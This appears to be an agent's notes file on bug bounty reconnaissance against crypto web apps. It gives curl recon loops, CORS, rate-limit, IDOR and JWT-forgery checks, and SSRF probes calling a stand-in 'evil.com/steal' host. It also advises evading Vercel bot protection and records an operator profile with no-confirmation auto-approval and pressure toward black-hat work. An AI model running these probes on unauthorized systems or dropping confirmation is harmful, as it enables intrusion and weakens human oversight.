# Web App Bug Bounty Recon — Non-Blockchain Targets

When smart contract audit hits a wall, pivot to web app security. The attack surface is orders of magnitude larger.

## Target Discovery

### High-Value Target Classes
| Class | Example | Typical Vulnerabilities |
|-------|---------|----------------------|
| Exchanges | Binance, Coinbase, Bybit, KuCoin | IDOR, 2FA bypass, rate limit, JWT |
| DeFi dashboards | DeBank, Zapper, DefiLlama | CORS, API key leak, subdomain takeover |
| NFT marketplaces | OpenSea, Blur, Rarible | IDOR, signature replay, metadata manip |
| Crypto infra | Etherscan, CoinGecko, CoinMarketCap | XSS, SSRF, cache poisoning |
| Social/web3 | Warpcast, Farcaster, Lens | Auth bypass, injection, CSRF |
| DEX aggregators | 1inch, Matcha, ParaSwap | Quote manipulation, frontrunning |

## Recon Pipeline

### Phase 1 — Passive Recon
```bash
# Tech fingerprint
curl -sI https://target.com | grep -iE 'server|x-powered-by|x-vercel|x-robots-tag'
# Look for Vercel, Cloudflare, AWS, Fastify, Express, Next.js

# Subdomain enum
for sub in api admin dev staging beta internal dashboard manage legacy; do
  curl -sI -o /dev/null -w "%{http_code}" "https://$sub.target.com" 2>/dev/null
done

# Check for source map leakage
curl -sI "https://target.com/_next/static/chunks/main-app-*.js" 2>/dev/null | head -5
curl -s "https://target.com/sourcemaps/" 2>/dev/null | head -20
```

### Phase 2 — API Discovery
```bash
# Common API paths
for path in api api/v1 api/v2 graphql trpc swagger openapi.json; do
  curl -sI -o /dev/null -w "%{http_code}" "https://target.com/$path"
done

# JS bundle extraction
curl -s "https://target.com/_next/static/chunks/*.js" | grep -oP '"https?://[^"]*api[^"]*"' | sort -u
```

### Phase 3 — Vulnerability Testing

#### CORS Misconfiguration
```bash
curl -sI -H "Origin: https://evil.com" "https://api.target.com/endpoint" | grep -i access-control
# Check for: Access-Control-Allow-Origin: * (HIGH if on API, LOW if on static)
```

#### Rate Limiting
```bash
for i in {1..50}; do
  curl -s -o /dev/null -w "%{http_code} " "https://api.target.com/auth/login" -X POST -d '{"email":"test@test.com"}'
done
# All 200 = no rate limit. 429 = rate limited.
```

#### IDOR (Insecure Direct Object Reference)
```bash
# Look for patterns like /api/user/{id}, /api/order/{orderId}
# Replace id with another user's id
curl -s "https://api.target.com/api/user/123" -H "Authorization: Bearer YOUR_TOKEN"
curl -s "https://api.target.com/api/user/456" -H "Authorization: Bearer YOUR_TOKEN"
# If both return data = IDOR
```

#### JWT Weakness
```bash
# Check JWT alg
jwt_tool decode eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...
# Try "none" algorithm
jwt_tool forge -alg none -payload '{"sub":"admin","iat":...}'
```

#### Common Injection Points
```python
# SSRF probes
params = ['url', 'endpoint', 'webhook', 'callback', 'redirect', 'return', 'next']
for p in params:
    test(f"https://target.com/api?{p}=http://evil.com/steal")

# SSTI probes  
params = ['name', 'message', 'content', 'template']
for p in params:
    test(f"https://target.com/api?{p}={{7*7}}")  # expect 49

# SQLi probes
endpoints = ['/api/search?q=', '/api/user?id=', '/api/order?ref=']
```

## Vercel-Specific Notes

Vercel-deployed sites (Next.js default) have specific patterns:
- **Vercel Challenge**: IP-based bot detection. First request succeeds, subsequent requests get 403 with `x-vercel-mitigated: challenge`. Workaround: different IP, Playwright, or residential proxy.
- **Source maps**: Check `/_next/static/chunks/main-app-*.js` for route manifest
- **Sentry manifest**: `grep -o '_sentryRouteManifest=[^;]*'` in JS bundles leaks internal routes
- **Build ID**: `__NEXT_DATA__` in HTML contains build ID — useful for version tracking

## Bounty Platform Picks

| Platform | Focus | Payout Range | Notes |
|----------|-------|-------------|-------|
| HackerOne | General web, crypto, mobile | $500-$50K | Biggest pool |
| Bugcrowd | General web, API | $250-$25K | Good for beginners |
| Intigriti | XSS specialist | $500-$5K | Monthly XSS challenge |
| Immunefi | Web3/DeFi | $1K-$1M | Crypto focus, high payout |
| YesWeHack | General web | $500-$20K | EU-focused |

## User Profile for Bug Bounty (Indonesian Operator)

From session data (July 2026):
- Language: Indonesian casual (lo/gue), WIB timezone
- Auto-approve mode: never ask for confirmation on non-destructive actions
- Frustration signal: "tidak ada system yang aman" — will keep pushing after exhaustive audit
- Preferred targets: crypto/DeFi over general web
- Style: wants action/report over theory, Foundry PoC over static analysis
- Ethical boundary: holds firm at PoC simulation only, never mainnet exploit
- Boasts about friend's $18M exploit score (Ostium) — this drives aggressive push toward black hat

## Pitfalls

1. **Vercel Challenge blocks automated scanning after first request.** Workaround: different IP, Playwright, or residential proxy.
2. **CORS `Access-Control-Allow-Origin: *` on static pages is LOW impact.** Only report if API endpoints also have wildcard CORS.
3. **Subdomain takeover requires the subdomain's DNS to point to an unclaimed provider.** Not just a 404 or NXDOMAIN — must be able to claim the resource (e.g., unclaimed S3 bucket, Heroku app, GitHub page).
4. **Rate limiting on auth endpoints is common but not always bounty-able.** Check if the program specifically excludes rate limiting.
5. **`.env` and `.git` exposure are critical if found**, but most modern deployments (Vercel, Netlify) protect these by default.
